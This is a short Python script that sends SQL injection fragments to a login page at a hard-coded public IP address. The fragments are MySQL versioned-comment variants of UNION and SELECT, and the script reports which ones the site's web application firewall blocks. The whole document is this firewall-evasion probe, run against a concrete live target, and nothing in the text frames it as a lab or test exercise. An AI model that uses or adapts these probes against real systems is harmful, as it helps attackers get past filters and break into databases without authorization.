import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"})
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:40}] waf={waf}")

test("'/*!50000UNION*/", "union-versioned-alone")
test("'/*!50000SELECT*/", "select-versioned-alone")
test("'/*!UNION*/", "union-unversioned-alone")
test("'/*!SELECT*/", "select-unversioned-alone")
test("'UNION", "union-plain")
test("'SELECT", "select-plain")
test("'/*!50000union*/", "union-lowercase-versioned")
test("'/*!50000select*/", "select-lowercase-versioned")
